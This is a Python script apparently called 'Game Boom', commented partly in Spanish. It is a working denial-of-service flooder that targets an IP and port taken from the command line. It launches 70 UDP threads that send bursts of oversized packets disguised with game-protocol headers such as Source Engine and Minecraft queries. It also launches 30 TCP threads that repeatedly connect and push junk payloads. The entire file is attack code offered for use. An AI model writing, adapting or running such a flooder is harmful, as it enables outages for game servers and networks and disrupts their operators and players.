import socket
import random
import sys
import time
import threading

def udp_game_boom(target_ip, target_port, duration):
    """70% UDP game packets"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Paquetes UDP grandes de juegos
    udp_game_packets = [
        # Minecraft (grande)
        b'\xFE\xFD\x09' + random._urandom(800),
        b'\x00' * 100 + random._urandom(700),
        
        # Counter-Strike Source (grande)
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + random._urandom(900),
        b'\xFF\xFF\xFF\xFFdetails\x00' + random._urandom(850),
        
        # Fortnite-like (muy grande)
        random._urandom(1200),
        random._urandom(1100),
        
        # GTA Online (grande)
        random._urandom(1000),
        random._urandom(950),
        
        # Battlefield (grande)
        random._urandom(1150),
        random._urandom(1050),
        
        # Apex Legends (grande)
        b'\xFF\xFF\xFF\xFFinfo\x00' + random._urandom(900),
        
        # Call of Duty (grande)
        b'\xFF\xFF\xFF\xFFgetinfo\x00' + random._urandom(950),
        b'\xFF\xFF\xFF\xFFgetstatus\x00' + random._urandom(850),
        
        # Steam (grande)
        b'\xFF\xFF\xFF\xFF\x55' + random._urandom(800),
        b'\xFF\xFF\xFF\xFF\x56' + random._urandom(750),
        
        # Rust (grande)
        b'\x00\x00\x00\x00' + random._urandom(1000),
        
        # ARK Survival (muy grande)
        random._urandom(1300),
        
        # PUBG/Warzone (grande)
        random._urandom(1250),
        
        # Satisfactory (más grande)
        random._urandom(1400),
        random._urandom(1350),
        
        # Dota 2 (grande)
        b'\xFF\xFF\xFF\xFF\x49' + random._urandom(900),
        
        # Overwatch (grande)
        random._urandom(1100),
        
        # Valorant-like (grande)
        b'\x03\x00\x00\x00' + random._urandom(950),
        
        # Rainbow Six (grande)
        b'\x02' + random._urandom(1000),
        
        # Among Us (grande)
        b'\x00' * 50 + random._urandom(850),
        
        # Roblox (grande)
        random._urandom(1150),
        
        # Palworld (grande)
        b'\x50\x41\x4C' + random._urandom(1050),
        
        # Sea of Thieves (grande)
        b'\x53\x4F\x54' + random._urandom(1000),
    ]
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            # Enviar ráfaga de paquetes UDP grandes
            for _ in range(random.randint(20, 100)):
                packet = random.choice(udp_game_packets)
                sock.sendto(packet, (target_ip, target_port))
            
            time.sleep(0.001)
            
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()

def tcp_game_boom(target_ip, target_port, duration):
    """30% TCP game packets"""
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_ip, target_port))
            
            # TCP game-like payloads (grandes)
            tcp_payloads = [
                # Minecraft TCP-like (handshake grande)
                b'\x00' + random._urandom(500) + b'\x00\x00\x00' + random._urandom(400),
                
                # HTTP-like game query
                b'GET /server-info HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n\r\n' + random._urandom(600),
                
                # Steam TCP query
                b'\xFF\xFF\xFF\xFF' + random._urandom(700),
                
                # Game status request
                b'STATUS\r\n' + random._urandom(800),
                
                # Large game data
                random._urandom(1000),
                random._urandom(1200),
                random._urandom(1100),
                
                # JSON-like game data
                b'{"game":"query","players":' + str(random.randint(100, 1000)).encode() + b'}' + random._urandom(500),
                
                # Binary game packet
                b'\x01\x02\x03\x04' + random._urandom(900),
                
                # XML-like game data
                b'<?xml version="1.0"?><game><status>online</status></game>' + random._urandom(600),
            ]
            
            # Enviar múltiples payloads por conexión
            for _ in range(random.randint(3, 10)):
                payload = random.choice(tcp_payloads)
                sock.send(payload)
                time.sleep(0.01)
            
            sock.close()
            
        except:
            pass

def start_game_boom(target_ip, target_port, duration):
    """Iniciar Game Boom (70% UDP, 30% TCP)"""
    
    # UDP threads (70%)
    udp_threads = []
    for _ in range(70):  # 7 threads para 70%
        t = threading.Thread(target=udp_game_boom, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        udp_threads.append(t)
    
    # TCP threads (30%)
    tcp_threads = []
    for _ in range(30):  # 3 threads para 30%
        t = threading.Thread(target=tcp_game_boom, args=(target_ip, target_port, duration))
        t.daemon = True
        t.start()
        tcp_threads.append(t)
    
    # Esperar
    time.sleep(duration)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    start_game_boom(target_ip, target_port, duration)
